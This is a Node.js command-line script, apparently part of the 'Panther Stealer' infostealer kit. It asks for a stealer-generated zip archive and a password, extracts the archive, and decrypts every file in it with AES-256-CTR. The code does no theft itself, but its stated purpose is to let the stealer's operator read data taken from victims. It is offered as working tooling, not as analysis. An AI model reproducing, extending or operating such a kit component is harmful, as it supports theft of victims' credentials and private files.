(async () => {
    console.clear()
    process.title = ''

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    // Follow the step by step instructions written in "README.md" to avoid problems.

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const fs = require('fs'),
        path = require('path'),
        readline = require('readline'),
        crypto = require('crypto'),
        chalk = (await import('chalk')).default,
        admzip = require('adm-zip')

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const question = (c) => new Promise(async (resolve) => {
        const rl = readline.createInterface({
            'input': process.stdin,
            'output': process.stdout,
            'setEncoding': 'utf8'
        })

        return rl.question(c, async (a) => {
            rl.close()
            resolve(a)
        })
    })

    async function getFiles(dir, fileList = []) {
        const files = await fs.promises.readdir(dir);

        for (const file of files) {
            const filePath = path.join(dir, file);
            const stat = await fs.promises.stat(filePath);

            if (stat.isDirectory()) {
                await getFiles(filePath, fileList);
            } else {
                fileList.push(filePath);
            }
        }

        return fileList;
    }


    async function decrypt(c, h) {
        return new Promise((resolve, reject) => {
            try {
                const [g, k] = c.split(':')
                const iv = Buffer.from(g, 'hex')
                const b = crypto.createDecipheriv('aes-256-ctr', crypto.createHash('sha256').update(h).digest(), iv)
                let l = b.update(k, 'hex', 'utf8')
                l += b.final('utf8')
                resolve(l)
            } catch (error) {
                reject(error)
            }
        })
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    console.log(chalk.bold.cyan(`
        ██████╗ ███████╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗
        ██╔══██╗██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝
        ██║  ██║█████╗  ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   
        ██║  ██║██╔══╝  ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   
        ██████╔╝███████╗╚██████╗██║  ██║   ██║   ██║        ██║   
        ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝\n`))

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const file = await question(chalk.bold.cyan('[#] Directory of zip file generated by Panther Stealer: '))
    const pass = await question(chalk.bold.cyan('[#] Encryption password (Descript Key): '))

    if (!fs.existsSync(file) || !String(file).endsWith('.zip')) {
        return console.log(chalk.bold.red('[@] The file directory does not exist or is not a zip file.'))
    }

    if (!pass) {
        return console.log(chalk.bold.red('[@] The password is required to decrypt.'))
    }

    const nome = path.basename(file).replace('.zip', '')

    const zip = new admzip(file)
    zip.extractAllTo(path.resolve(path.dirname(file), nome), true)

    const files = await getFiles(path.resolve(path.dirname(file), nome))

    if (files.length === 0) {
        return console.log(chalk.bold.red(`[@] No files found for decryption in "${nome}".`))
    } else {
        console.log(chalk.bold.green(`[$] A total of ${files.length} files were found to decrypt, initiating.`))
    }

    for await (const value of files) {
        try {
            let content = (await fs.promises.readFile(value, 'utf-8')).replaceAll('"', '')
            content = await decrypt(content, pass)
            await fs.promises.writeFile(value, String(content))
        } catch (e) {
            console.log(chalk.bold.red('[@] An error occurred while decrypting:', e))
            break
        }
    }

    console.log(chalk.bold.green('[$] Decrypt files successfully, access:', path.resolve(path.dirname(file), nome)))
})()